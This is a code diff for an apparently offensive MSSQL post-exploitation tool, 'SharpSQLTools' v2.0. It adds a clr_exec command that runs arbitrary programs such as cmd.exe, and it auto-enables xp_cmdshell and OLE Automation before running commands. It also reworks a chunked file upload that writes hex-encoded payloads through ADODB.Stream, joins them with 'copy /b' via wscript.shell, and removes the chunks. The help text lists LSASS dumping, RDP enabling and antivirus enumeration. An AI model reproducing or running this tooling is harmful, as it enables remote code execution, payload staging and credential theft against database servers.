@@ -30,6 +30,8 @@ enable_clr                 - you know what it means
 disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
+clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
+clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files           
 clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
 clr_getav                  - get anti-virus software on this machin by clr
@@ -49,7 +51,7 @@ exit                       - terminates the server process (and this session)"
  | (___ | |__   __ _ _ __ _ __| (___ | |  | | |    | | ___   ___ | |___ 
   \___ \| '_ \ / _` | '__| '_ \\___ \| |  | | |    | |/ _ \ / _ \| / __|
   ____) | | | | (_| | |  | |_) |___) | |__| | |____| | (_) | (_) | \__ \
- |_____/|_| |_|\__,_|_|  | .__/_____/ \___\_\______|_|\___/ \___/|_|___/
+ |_____/|_| |_|\__,_|_|  | .__/_____/ \___\_\______|_|\___/ \___/|_|___/    v2.0
                          | |                                            
                          |_|                              
                                                     by Rcoil & Uknow
@@ -62,6 +64,10 @@ exit                       - terminates the server process (and this session)"
         /// <param name="Command">命令</param>
         static void xp_shell(String Command)
         {
+            if (setting.Check_configuration("xp_cmdshell", 0) && !setting.Enable_xp_cmdshell())
+            {
+                return;
+            }
             sqlstr = String.Format("exec master..xp_cmdshell '{0}'", Command);
             Console.WriteLine(Batch.RemoteExec(Conn, sqlstr, true));
         }
@@ -81,9 +87,9 @@ exit                       - terminates the server process (and this session)"
         /// <param name="Command">命令</param>
         static void sp_shell(String Command)
         {
-            if (setting.Check_configuration("Ole Automation Procedures", 0))
+            if (setting.Check_configuration("Ole Automation Procedures", 0) && !setting.Enable_ola())
             {
-                if (setting.Enable_ola()) return;
+                return;
             }
             string sqlstr = String.Format(@"
                     declare @shell int,@exec int,@text int,@str varchar(8000); 
@@ -105,28 +111,50 @@ exit                       - terminates the server process (and this session)"
             Batch.CLRExec(Conn, sqlstr);
         }
 
-        /// <summary>
-        ///  把字符串按照指定长度分割
-        /// </summary>
-        /// <param name="txtString">字符串</param>
-        /// <param name="charNumber">长度</param>
-        /// <returns></returns>
-        private static ArrayList GetSeparateSubString(string txtString, int charNumber)
+
+        static byte[] ReadFileToByte(string filePath)
         {
-            ArrayList arrlist = new ArrayList();
-            string tempStr = txtString;
-            for (int i = 0; i < tempStr.Length; i += charNumber)
+            byte[] result;
+            try
             {
-                if ((tempStr.Length - i) > charNumber)//如果是，就截取
+                using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                 {
-                    arrlist.Add(tempStr.Substring(i, charNumber));
-                }
-                else
-                {
-                    arrlist.Add(tempStr.Substring(i));//如果不是，就截取最后剩下的那部分
+                    byte[] array = new byte[fileStream.Length];
+                    fileStream.Read(array, 0, array.Length);
+                    result = array;
                 }
             }
-            return arrlist;
+            catch
+            {
+                result = null;
+            }
+            return result;
+        }
+
+        static private List<int> SplitFileSize(int fileSize, int splitLength)
+        {
+            List<int> list = new List<int>();
+            if (fileSize > splitLength)
+            {
+                int num = fileSize / splitLength;
+                int num2 = fileSize % splitLength;
+                if (num > 0)
+                {
+                    for (int i = 0; i < num; i++)
+                    {
+                        list.Add(splitLength);
+                    }
+                    if (num2 != 0)
+                    {
+                        list.Add(num2);
+                    }
+                }
+            }
+            else
+            {
+                list.Add(fileSize);
+            }
+            return list;
         }
 
         /// <summary>
@@ -138,22 +166,30 @@ exit                       - terminates the server process (and this session)"
         {
             Console.WriteLine(String.Format("[*] Uploading '{0}' to '{1}'...", localFile, remoteFile));
 
-            if (setting.Check_configuration("Ole Automation Procedures", 0))
+            if (setting.Check_configuration("Ole Automation Procedures", 0) && !setting.Enable_ola())
             {
-                if (setting.Enable_ola()) return;
+                 return;
             }
-
-            int count = 0;
+            byte[] byteArray = ReadFileToByte(localFile);
+            string text = "copy /b ";
+            if (setting.File_Exists(remoteFile, 1))
+            {
+                Console.WriteLine("[+] {0} Exists", remoteFile);
+                return;
+            }
+            int num = 0;
+            int num2 = 0;
+            int splitLength = 250000;
+            List<int> list = SplitFileSize(byteArray.Length, splitLength);
             try
             {
-                string hexString = string.Concat(File.ReadAllBytes(localFile).Select(b => b.ToString("X2")));
-                ArrayList arrlist = GetSeparateSubString(hexString, 150000);
-
-                foreach (string hex150000 in arrlist)
+                foreach (int num3 in list)
                 {
-                    count++;
-                    string filePath = String.Format("{0}_{1}.config_txt", remoteFile, count);
-
+                    string text2 = string.Format("{0}_{1}.config_txt", remoteFile, num);
+                    byte[] array = new byte[num3];
+                    Array.Copy(byteArray, num2, array, 0, num3);
+                    string hexstr = string.Concat(from b in array
+                                                  select b.ToString("X2"));
                     sqlstr = String.Format(@"
                         DECLARE @ObjectToken INT
                         EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
@@ -162,52 +198,47 @@ exit                       - terminates the server process (and this session)"
                         EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{0}
                         EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL,'{1}', 2
                         EXEC sp_OAMethod @ObjectToken, 'Close'
-                        EXEC sp_OADestroy @ObjectToken", hex150000, filePath);
+                        EXEC sp_OADestroy @ObjectToken", hexstr, text2);
                     Batch.RemoteExec(Conn, sqlstr, false);
-                    if (setting.File_Exists(filePath, 1))
-                    {
-                        Console.WriteLine("[+] {0}-{1} Upload completed", arrlist.Count, count);
-                    }
-                    else
-                    {
-                        Console.WriteLine("[!] {0}-{1} Error uploading", arrlist.Count, count);
-                        Conn.Close();
-                        Environment.Exit(0);
-                    }
+                    num2 += num3;
+                    num++;
+                    text = text + "\"" + text2 + "\"+";
+                    Thread.Sleep(1000);
+                    if (setting.File_Exists(text2, 1))
+                       {
+                           Console.WriteLine("[+] {0}_{1}.config_txt Upload completed", remoteFile, num);
+                       }
+                       else
+                       {
+                           Console.WriteLine("[!] {0}_{1}.config_txt Error uploading", remoteFile, num);
+                           Conn.Close();
+                           Environment.Exit(0);
+                       }
 
-                    Thread.Sleep(5000);
+                    Thread.Sleep(1000);
                 }
 
+                text = text.Trim(new char[]
+                {
+                                    '+'
+                }) + " \"" + remoteFile + "\"'";
                 string shell = String.Format(@"
                     DECLARE @SHELL INT 
                     EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT 
                     EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\windows\system32\cmd.exe /c ");
 
-                sqlstr = "copy /b ";
-                for (int i = 1; i < count + 1; i++)
-                {
-                    if (i != count)
-                    {
-                        sqlstr += String.Format(@"{0}_{1}.config_txt+", remoteFile, i);
-                    }
-                    else
-                    {
-                        sqlstr += String.Format(@"{0}_{1}.config_txt {0}'", remoteFile, i);
-                    }
-                }
-
                 Console.WriteLine(@"[+] copy /b {0}_x.config_txt {0}", remoteFile);
-                Batch.RemoteExec(Conn, shell + sqlstr, false);
-                Thread.Sleep(5000);
-
-                sqlstr = String.Format(@"del {0}*.config_txt'", remoteFile.Replace(Path.GetFileName(remoteFile), ""));
-                Console.WriteLine("[+] {0}", sqlstr.Replace("'", ""));
-                Batch.RemoteExec(Conn, shell + sqlstr, false);
+                Batch.RemoteExec(Conn,shell + text, false);
+                Thread.Sleep(1000);
 
                 if (setting.File_Exists(remoteFile, 1))
                 {
+                    sqlstr = String.Format(@"del {0}*.config_txt'", remoteFile.Replace(Path.GetFileName(remoteFile), ""));
+                    Console.WriteLine("[+] {0}", sqlstr.Replace("'", ""));
+                    Batch.RemoteExec(Conn, shell + sqlstr, false);
                     Console.WriteLine("[*] '{0}' Upload completed", localFile);
                 }
+                //setting.Disable_ole();
             }
             catch (Exception ex)
             {
@@ -268,14 +299,17 @@ exit                       - terminates the server process (and this session)"
         static void interactive(string[] args)
         {
             string target = args[0];
+            if (target.Contains(":"))
+            {
+                target = target.Replace(":", ",");
+            }
             string username = args[1];
             string password = args[2];
             string database = args[3];
-
             try
             {
                 //sql建立连接
-                string connectionString = String.Format("Server = \"{0}\";Database = \"{1}\";User ID = \"{2}\";Password = \"{3}\";", target,database, username, password);
+                string connectionString = String.Format("Server = \"{0}\";Database = \"{1}\";User ID = \"{2}\";Password = \"{3}\";", target, database, username, password);
                 Conn = new SqlConnection(connectionString);
                 Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
                 Conn.Open();
@@ -356,6 +390,13 @@ exit                       - terminates the server process (and this session)"
                                 clr_exec(s);
                                 break;
                             }
+                        case "clr_exec":
+                            {
+                                String s = String.Empty;
+                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                clr_exec(s);
+                                break;
+                            }
                         case "clr_scloader":
                             {
                                 String s = String.Empty;
@@ -384,6 +425,13 @@ exit                       - terminates the server process (and this session)"
                                 clr_exec(s);
                                 break;
                             }
+                        case "clr_combine":
+                            {
+                                String s = String.Empty;
+                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                clr_exec(s);
+                                break;
+                            }
                         case "enable_clr":
                             setting.Enable_clr();
                             break;
@@ -392,10 +440,7 @@ exit                       - terminates the server process (and this session)"
                             break;
                         case "install_clr":
                             {
-                                setting.Set_permission_set();
-                                setting.CREATE_ASSEMBLY();
-                                setting.CREATE_PROCEDURE();
-                                Console.WriteLine("[+] Install clr done.");
+                                setting.install_clr();
                                 break;
                             }
                         case "uninstall_clr":
@@ -429,6 +474,10 @@ exit                       - terminates the server process (and this session)"
                 return;
             }
             string target = args[0];
+            if (target.Contains(":"))
+            {
+                target = target.Replace(":", ",");
+            }
             string username = args[1];
             string password = args[2];
             string database = args[3];
@@ -525,6 +574,13 @@ exit                       - terminates the server process (and this session)"
                             clr_exec(s);
                             break;
                         }
+                    case "clr_exec":
+                        {
+                            String s = String.Empty;
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
+                            break;
+                        }
                     case "clr_scloader":
                         {
                             String s = String.Empty;
@@ -553,6 +609,13 @@ exit                       - terminates the server process (and this session)"
                             clr_exec(s);
                             break;
                         }
+                    case "clr_combine":
+                        {
+                            String s = String.Empty;
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
+                            break;
+                        }
                     case "enable_clr":
                         setting.Enable_clr();
                         break;
@@ -561,10 +624,7 @@ exit                       - terminates the server process (and this session)"
                         break;
                     case "install_clr":
                         {
-                            setting.Set_permission_set();
-                            setting.CREATE_ASSEMBLY();
-                            setting.CREATE_PROCEDURE();
-                            Console.WriteLine("[+] Install crl successful!");
+                            setting.install_clr();
                             break;
                         }
                     case "uninstall_clr":
